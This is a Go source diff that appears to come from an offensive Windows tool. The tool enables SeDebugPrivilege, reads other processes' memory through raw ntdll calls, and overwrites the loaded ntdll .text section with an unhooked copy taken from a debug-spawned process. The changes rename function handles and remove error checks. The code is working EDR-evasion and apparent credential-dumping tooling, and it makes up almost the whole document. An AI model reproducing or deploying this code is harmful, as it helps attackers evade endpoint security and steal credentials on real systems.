@@ -10,7 +10,7 @@ import (
     "strings"
     "strconv"
     "math/big"
-    "github.com/alexmullins/zip" //"archive/zip"
+    "github.com/alexmullins/zip"
     "crypto/rand"
     "encoding/json"
     "unicode/utf16"
@@ -43,22 +43,20 @@ const (
 
 var (
     ntGetNextProcess *windows.LazyProc
-    ntOpenProcess *windows.LazyProc
     ntQueryInformationProcess *windows.LazyProc
     ntReadVirtualMemory *windows.LazyProc
     ntQueryVirtualMemory *windows.LazyProc
     ntOpenProcessToken *windows.LazyProc
     ntAdjustPrivilegesToken *windows.LazyProc
     ntClose *windows.LazyProc
-
-    VirtualProtect *windows.LazyProc
+    ntOpenSection *windows.LazyProc
+    virtualProtect *windows.LazyProc
     createFile *windows.LazyProc
     createFileMapping *windows.LazyProc
     mapViewOfFile *windows.LazyProc
-    DebugActiveProcessStop *windows.LazyProc
-    TerminateProcess *windows.LazyProc
-    CreateProcess *windows.LazyProc
-    ntOpenSection *windows.LazyProc
+    debugActiveProcessStop *windows.LazyProc
+    terminateProcess *windows.LazyProc
+    createProcess *windows.LazyProc
 )
 
 
@@ -162,7 +160,6 @@ func init() {
     ntdll := windows.NewLazySystemDLL("ntdll.dll")
     ntGetNextProcess = ntdll.NewProc("NtGetNextProcess")
     ntQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
-    ntOpenProcess = ntdll.NewProc("NtOpenProcess")
     ntReadVirtualMemory = ntdll.NewProc("NtReadVirtualMemory")
     ntQueryVirtualMemory = ntdll.NewProc("NtQueryVirtualMemory")
     ntOpenProcessToken = ntdll.NewProc("NtOpenProcessToken")
@@ -171,13 +168,13 @@ func init() {
     ntOpenSection = ntdll.NewProc("NtOpenSection")
     // kernel32
     kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-    VirtualProtect = kernel32.NewProc("VirtualProtect")
+    virtualProtect = kernel32.NewProc("VirtualProtect")
     createFile = kernel32.NewProc("CreateFileA")
     createFileMapping = kernel32.NewProc("CreateFileMappingA")
     mapViewOfFile = kernel32.NewProc("MapViewOfFile")
-    DebugActiveProcessStop = kernel32.NewProc("DebugActiveProcessStop")
-    TerminateProcess = kernel32.NewProc("TerminateProcess")
-    CreateProcess = kernel32.NewProc("CreateProcessW")
+    debugActiveProcessStop = kernel32.NewProc("DebugActiveProcessStop")
+    terminateProcess = kernel32.NewProc("TerminateProcess")
+    createProcess = kernel32.NewProc("CreateProcessW")
 }
 
 
@@ -221,12 +218,12 @@ func GetProcessByName(process_name string) uintptr{
 
 
 func enable_SeDebugPrivilege() bool {
-    pid := uintptr(syscall.Getpid())
-    hProcess := open_process(pid)
-
+    execPath, _ := os.Executable()
+    proc_handle := GetProcessByName(execPath)
+    
     // NtOpenProcessToken
     var tokenHandle syscall.Token
-    ntstatus, _, _ := ntOpenProcessToken.Call(uintptr(hProcess), uintptr(TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), uintptr(unsafe.Pointer(&tokenHandle)))
+    ntstatus, _, _ := ntOpenProcessToken.Call(uintptr(proc_handle), uintptr(TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), uintptr(unsafe.Pointer(&tokenHandle)))
     if ntstatus != 0 {
         fmt.Printf("[-] NtOpenProcessToken error status: 0x%x\n", ntstatus)
         return false
@@ -255,20 +252,6 @@ func enable_SeDebugPrivilege() bool {
 }
 
 
-func open_process(pid uintptr) uintptr {
-    var handle uintptr
-    objectAttributes := OBJECT_ATTRIBUTES{}
-    clientId := CLIENT_ID{UniqueProcess: pid}
-
-    status, _, _ := ntOpenProcess.Call(uintptr(unsafe.Pointer(&handle)), PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, uintptr(unsafe.Pointer(&objectAttributes)), uintptr(unsafe.Pointer(&clientId)))
-    if (status != 0) {
-        fmt.Printf("[-] Failed to open process. NTSTATUS: 0x%X\n", status)
-        return 0
-    }
-    return handle
-}
-
-
 func randomString(length int) (string) {
     result := make([]byte, length)
     for i := range result {
@@ -282,19 +265,6 @@ func randomString(length int) (string) {
 }
 
 
-func read_remoteintptr(process_handle uintptr, base_address uintptr, size uintptr) uintptr {
-    buffer := make([]byte, size)
-    var bytesRead uintptr
-    status, _, _ := ntReadVirtualMemory.Call(uintptr(process_handle), base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
-    if status != 0 && status != 0x8000000d && status != 0xc0000005 {
-        fmt.Printf("[-] NtReadVirtualMemory failed with status: 0x%x\n", status)
-        return 0
-    }
-    read_value := *(*uintptr)(unsafe.Pointer(&buffer[0]))
-    return read_value
-}
-
-
 func utf16BytesToUTF8(utf16Bytes []byte) []byte {
     u16s := make([]uint16, len(utf16Bytes)/2)
     for i := range u16s {
@@ -304,14 +274,19 @@ func utf16BytesToUTF8(utf16Bytes []byte) []byte {
 }
 
 
+func read_remoteintptr(process_handle uintptr, base_address uintptr, size uintptr) uintptr {
+    buffer := make([]byte, size)
+    var bytesRead uintptr
+    ntReadVirtualMemory.Call(uintptr(process_handle), base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
+    read_value := *(*uintptr)(unsafe.Pointer(&buffer[0]))
+    return read_value
+}
+
+
 func read_remoteWStr(process_handle uintptr, base_address uintptr, size uintptr) string {
     buffer := make([]byte, size)
     var bytesRead uintptr
-    status, _, _ := ntReadVirtualMemory.Call(uintptr(process_handle), base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
-    if status != 0 && status != 0x8000000d && status != 0xc0000005 {
-        fmt.Printf("[-] NtReadVirtualMemory failed with status: 0x%x\n", status)
-        return ""
-    }
+    ntReadVirtualMemory.Call(uintptr(process_handle), base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
     for i := 0; i < int(bytesRead)-1; i += 1 {
         if buffer[i] == 0x00 && buffer[i+1] == 0x00 {
             return string(utf16BytesToUTF8(buffer[:i+2]))
@@ -322,14 +297,13 @@ func read_remoteWStr(process_handle uintptr, base_address uintptr, size uintptr)
 
 
 func get_local_lib_address(dll_name string) uintptr {
-    // GetCurrentProcess
-    proc_handle, _ := windows.GetCurrentProcess()
-    process_handle := uintptr(proc_handle)
-    // fmt.Printf("[+] Process Handle: \t%d\n", process_handle)
-    var pbi PROCESS_BASIC_INFORMATION
-    var returnLength uint32
+    // Get current process handle
+    execPath, _ := os.Executable()
+    process_handle := GetProcessByName(execPath)
 
     // NtQueryInformationProcess
+    var pbi PROCESS_BASIC_INFORMATION
+    var returnLength uint32
     status, _, _ := ntQueryInformationProcess.Call(uintptr(process_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
     if status != 0 {
         fmt.Printf("[-] NtQueryInformationProcess failed with status: 0x%x\n", status)
@@ -370,8 +344,8 @@ func get_local_lib_address(dll_name string) uintptr {
 
 
 func get_section_info(base_address uintptr) (uintptr,uintptr) {
-    proc_handle, _ := windows.GetCurrentProcess()
-    process_handle := uintptr(proc_handle)
+    execPath, _ := os.Executable()
+    process_handle := GetProcessByName(execPath)
     if (fmt.Sprintf("%d", process_handle) == ""){ return 0,0}
     var e_lfanew_addr uintptr = base_address + 0x3C
     var e_lfanew uintptr = read_remoteintptr(process_handle, e_lfanew_addr, 4)
@@ -387,7 +361,7 @@ func replace_ntdll_section(unhooked_ntdll_text uintptr, local_ntdll_txt uintptr,
     fmt.Printf("[+] Copying %d bytes from 0x%s to 0x%s\n", local_ntdll_txt_size, fmt.Sprintf("%x", unhooked_ntdll_text), fmt.Sprintf("%x", local_ntdll_txt))
 
     var oldProtect uintptr
-    res, _, _ := VirtualProtect.Call(local_ntdll_txt, local_ntdll_txt_size, PAGE_EXECUTE_WRITECOPY, uintptr(unsafe.Pointer(&oldProtect)))
+    res, _, _ := virtualProtect.Call(local_ntdll_txt, local_ntdll_txt_size, PAGE_EXECUTE_WRITECOPY, uintptr(unsafe.Pointer(&oldProtect)))
     if res != 1 {
         fmt.Println("[-] Failed to change memory protection to PAGE_EXECUTE_WRITECOPY")
         return
@@ -399,7 +373,7 @@ func replace_ntdll_section(unhooked_ntdll_text uintptr, local_ntdll_txt uintptr,
     }
     /// fmt.Scanln()
     // Restore the original protection
-    res, _, _ = VirtualProtect.Call(local_ntdll_txt, local_ntdll_txt_size, oldProtect, uintptr(unsafe.Pointer(&oldProtect)))
+    res, _, _ = virtualProtect.Call(local_ntdll_txt, local_ntdll_txt_size, oldProtect, uintptr(unsafe.Pointer(&oldProtect)))
     if res != 1 {
         fmt.Println("Failed to restore the original memory protection")
         return
@@ -492,7 +466,7 @@ func overwrite_debugproc(file_path string, local_ntdll_txt uintptr, local_ntdll_
     si.cb = uint32(unsafe.Sizeof(si))
     applicationName := windows.StringToUTF16Ptr(file_path)
 
-    success, _, err := CreateProcess.Call(uintptr(unsafe.Pointer(applicationName)), 0, 0, 0, 0, uintptr(DEBUG_PROCESS), 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))   
+    success, _, err := createProcess.Call(uintptr(unsafe.Pointer(applicationName)), 0, 0, 0, 0, uintptr(DEBUG_PROCESS), 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))   
     if (success != 1) {
         fmt.Printf("[-] CreateProcess failed: %v\n", err)
         os.Exit(0)
@@ -508,8 +482,8 @@ func overwrite_debugproc(file_path string, local_ntdll_txt uintptr, local_ntdll_
     }
 
     // TerminateProcess + DebugActiveProcessStop
-    tp_bool, _, _ := TerminateProcess.Call(uintptr(pi.hProcess), 0)
-    daps_bool, _, _ := DebugActiveProcessStop.Call(uintptr(pi.dwProcessId))
+    tp_bool, _, _ := terminateProcess.Call(uintptr(pi.hProcess), 0)
+    daps_bool, _, _ := debugActiveProcessStop.Call(uintptr(pi.dwProcessId))
     if (tp_bool != 1){
         fmt.Printf("[-] TerminateProcess failed")
         os.Exit(0)
